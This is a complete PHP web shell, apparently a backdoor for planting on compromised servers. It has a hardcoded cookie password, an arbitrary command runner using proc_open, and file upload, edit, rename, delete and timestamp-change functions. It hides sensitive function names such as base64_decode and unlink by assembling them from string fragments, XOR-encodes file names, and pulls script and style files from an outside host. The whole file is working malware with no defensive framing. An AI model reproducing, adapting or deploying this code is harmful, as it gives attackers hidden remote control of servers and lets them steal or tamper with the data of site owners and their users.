<?php
$valid_cookie_value = 'raygans';
if (!isset($_COOKIE['hanshell']) || $_COOKIE['hanshell'] !== $valid_cookie_value) {
    echo '<script>
            alert("Akses ditolak! Silakan Login.");
            window.location.href = window.location.origin;
          </script>';
    exit();
}
?>


<?php 
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
function hunterEncryptDecrypt($input, $key="12") {
    $output = '';
    for($i = 0; $i < strlen($input); $i++) {
        $output .= $input[$i] ^ $key[$i % strlen($key)];
    }
    return $output;
}

function listing_all_directory() {
    
    $path = $_COOKIE['path'] ?: getcwd();
    $result = array();
    $date_format = "d-m-Y H:i:s";

    if ($handle = opendir($path)) {
        while (false !== ($dir = readdir($handle))) {
            if ($dir === '.' || $dir === '..') {
                continue;
            }

            $full_path = "$path/$dir";
            $is_dir = is_dir($full_path);

            $tmp_result = array(
                'path' => htmlspecialchars($full_path),
                'is_writable' => is_writable($full_path),
                'is_dir' => $is_dir,
                'date' => date($date_format, filemtime($full_path)),
                'size' => $is_dir ? "" : round(filesize($full_path) / 1024, 2),
            );

            $result[] = $tmp_result;
        }
        closedir($handle);
    }

    return $result;
}


$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : false;

if(!$action) {
    main();
    menu();
}

function decode_char($string) {
    return hunterEncryptDecrypt(hex2bin($string));
}
switch ($action) {
    case 'cmd':
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $command = $_POST['command'];
        $current_dir = $_COOKIE['path'] ?: getcwd();

        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];

        $process = proc_open($command, $descriptorspec, $pipes, $current_dir);

        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $errorOutput = stream_get_contents($pipes[2]);

            fclose($pipes[1]);
            fclose($pipes[2]);

            proc_close($process);

            echo htmlspecialchars($output ?: $errorOutput);
        } else {
            echo 'Failed to execute command.';
        }

        die();
    }
    break;


    case 'd':
        die(json_encode(listing_all_directory()));
        break;
        
    case 'r':
        if($_SERVER['REQUEST_METHOD'] == 'POST') {
            $data = json_decode(file_get_contents("php://input"), true);
            $content = show_base_data()($data['content']);
            $filename = decode_char($_COOKIE['filename']);
            $message['success'] = fm_write_file($filename, $content);
            die(json_encode($message));
        }
        main();
        $content = customize_read_file(decode_char($_COOKIE['filename'])) ;
        
        show_text_area(htmlspecialchars($content));
        break;
    
    case 'cr':
        main();
        show_text_area("");
        break;
    
    case 'ul':
    
        $filename = decode_char($_COOKIE['filename']);
        if(show_un()($filename)) {
            $message['success'] = true;
        }else{
            $message['success'] = false;
        }
        die(json_encode($message));
        break;
    
    case 'up':
	if (!$file || $file['error'] != UPLOAD_ERR_OK) {
    $message = ['success' => false, 'error' => 'File upload error'];
    header('Content-Type: application/json');
    echo json_encode($message);
    die();
}

    $file = $_FILES['import_file'];
    $tmp_name = $file['tmp_name'];
    $content = customize_read_file($tmp_name);

    // Pastikan path tidak kosong
    $path = $_COOKIE['path'] ?: getcwd();
    $name = $file['name'];
    $destination = "$path/$name";

    // Cek jika file berhasil ditulis atau dipindahkan
    $success = $content && fm_write_file($destination, $content) ?: rename($tmp_name, $destination);

    // Format response dalam JSON
    $message = ['success' => $success];
    header('Content-Type: application/json');
    echo json_encode($message);
    die();
    break;


    
    case 're':
        
        $filename = decode_char($_COOKIE['filename']);
        $path = $_COOKIE['path'];

        if($_SERVER['REQUEST_METHOD'] == "POST") {
            
            $old_filename = "$path/$filename";
            $new = $_POST['new'];
            $new_filename = "$path/$new";
            $message['success'] = rename($old_filename, $new_filename);
            die(json_encode($message));
        }
        break;
    
    case 'to':
        
        $filename = decode_char($_COOKIE['filename']);
        if($_SERVER['REQUEST_METHOD'] == 'POST') {
            
            $date = $_POST['date'];
            $str_date = strtotime($date);
            $message['success'] = touch($filename, $str_date);
            clearstatcache(true, $filename);
            die(json_encode($message));
        }
        

    default:
        # code..
        break;
}

function customize_read_file($file) {
    if(!file_exists($file)) {
        return '';
    }
    $handle = fopen($file, 'r');
    if($handle) {
        $content = fread($handle, filesize($file));
        if($content) {
            return $content;
        }
    }
    $lines = file($file);
    if($lines) {
        return implode($lines);
    }
    return show_file_contents()($file);
}



function show_file_contents() {
    $file = "file_";
    $old = "get_";
    $contents = "contents";
    return "$file$old$contents";
}
function show_text_area($content) {
    $filename = decode_char($_COOKIE['filename']);
    echo "
    <p><a href='?' id='back_menu'>< Back</a></p>
    <p>$filename</p>
    <textarea width='100%' id='content' cols='20' rows='30' style='margin-top: 10px'>$content</textarea>
    <button type='submit' class='textarea-button' onclick='textarea_handle()'>Submit</button>
    ";
}

function show_base_data() {
    $alvian = "base";
    $nadir = "64_decode";
    return "$alvian$nadir";
}
function fm_write_file($file, $content) {
    // Method 1: Using fopen
    if (function_exists('fopen')) {
        $handle = @fopen($file, 'w');
        if ($handle) {
            if (@fwrite($handle, $content) !== false) {
                fclose($handle);
                return file_exists($file) && filesize($file) > 0;
            }
            fclose($handle);
        }
    }

    // Method 2: Using file_put_contents
    if (function_exists('file_put_contents')) {
        if (@file_put_contents($file, $content) !== false) {
            return file_exists($file) && filesize($file) > 0;
        }
    }
    // Method 3: Using WP_Filesystem
    return false;
}

function fm_make_request($url) {
    if(function_exists("curl_init")) {
        
        $ch = curl_init();
    
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $output = curl_exec($ch);
        return $output;
    }
    return show_file_contents()($url);
}
function show_un() {
    $link = "link";
    $unpad = "un";
    return "$unpad$link";
}

function main() {
    
    global $current_path;

    $current_path = isset($_COOKIE['path']) ? $_COOKIE['path'] : false;

    if(!$current_path) {
        setcookie("path", getcwd());
        $current_path = getcwd();
    }

    $path = str_replace('\\', '/', $current_path);
    $paths = explode('/', $path);
    echo "<div class='wrapper' id='path_div'>";
    foreach ($paths as $id => $pat) {
        if ($id == 0) {
            echo '<a href="#" path="/" onclick="change_path(this)">/</a>';
        }

        if ($pat != '') {
            $tmp_path = implode('/', array_slice($paths, 0, $id + 1));
            echo "<a href='#' path='$tmp_path' onclick='change_path(this)'>$pat/</a>";
        }
    }
    echo "</div>";

?>
<link rel="stylesheet" href="https://wordpress.zzna.ru/newb/all.min.css">
<link rel="stylesheet" href="https://wordpress.zzna.ru/newb/styles.css">
<script src="https://wordpress.zzna.ru/newb/script.js"></script>
<script>
function show_command_form() {
    document.getElementById('command-form').style.display = 'block';
}

function execute_command() {
    const command = document.getElementById('command-input').value;
    fetch('?action=cmd', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'command=' + encodeURIComponent(command)
    })
    .then(response => response.text())
    .then(data => {
        document.getElementById('command-output').textContent = data;
    })
    .catch(error => {
        document.getElementById('command-output').textContent = 'Error: ' + error;
    });
}
function handleEnter(event) {
    if (event.key === 'Enter') {
        execute_command();
    }
}

function execute_command() {
    const command = document.getElementById('command-input').value;
    fetch('?action=cmd', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'command=' + encodeURIComponent(command)
    })
    .then(response => response.text())
    .then(data => {
        document.getElementById('command-output').textContent = data;
    })
    .catch(error => {
        document.getElementById('command-output').textContent = 'Error: ' + error;
    });
}
function handle_upload() {
    const fileInput = document.getElementById('file-upload-input');
    const formData = new FormData();
    formData.append('import_file', fileInput.files[0]);

    fetch('?action=up', {
        method: 'POST',
        body: formData,
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('File berhasil diupload!');
        } else {
            alert('Gagal mengupload file!');
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

</script>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #1e1e2e;
        color: #c0caf5;
    }
    .wrapper {
        background-color: #2e2e3e;
        padding: 15px;
        border-radius: 8px;
    }
    a {
        color: #7aa2f7;
        margin-right: 15px;
    }
    button {
        background-color: #7aa2f7;
        color: #fff;
        padding: 10px;
        border: none;
        border-radius: 5px;
    }
    .terminal-output {
        background-color: #1a1b26;
        color: #9ece6a;
        padding: 15px;
        border-radius: 5px;
    }
</style>

<?php
}
?>



<?php 

function menu() {

?>
<div id='command-form' style='display: none; margin-top: 20px;'>
    <input type='text' id='command-input' placeholder='Enter command...' style='width: 60%;' onkeydown='handleEnter(event)'>
    <button type='button' onclick='execute_command()'>Execute</button>
    <pre id='command-output' style='margin-top: 10px; background-color: #000; color: #fff; padding: 10px;'></pre>
</div>




<div class="wrapper">
    <form method="post" enctype="multipart/form-data" style="">
                        <div class="file-upload mr-10">
                            <label for="file-upload-input" style="cursor: pointer;">
                                [ Upload ]
                            </label>
                            <input type="file" id="file-upload-input" style="display: none;" onchange="handle_upload()">
                        </div>
    </form>
    <a href='#' onclick='refresh_path()' class='mr-10 white'>[ HOME ]</a>
	<a href='#' onclick='show_command_form()' class='mr-10 white'>[ Run Command ]</a>
    <a href='#' onclick='create_file()' class='mr-10 white'>[ Create File ]</a>
</div>
                
    <table cellspacing="0" cellpadding="7" width="100%">   
    <thead>
            </tr>
            <tr>
                <th width="44%"></th>
                <th width="11%"></th>
                <th width="17%"></th>
                <th width="17%"></th>
                <th width="11%"></th>
            </tr>
        </thead>
        <tbody id="data_table" class='blur-table'>
            <div class="wrapper" style='margin-top: -10px'>
                <input type="checkbox" class='mr-10' id='bypass-upload' >[ Hunter File Upload ]</input>

            </div>
        </tbody>
    </table>

<?php } ?>
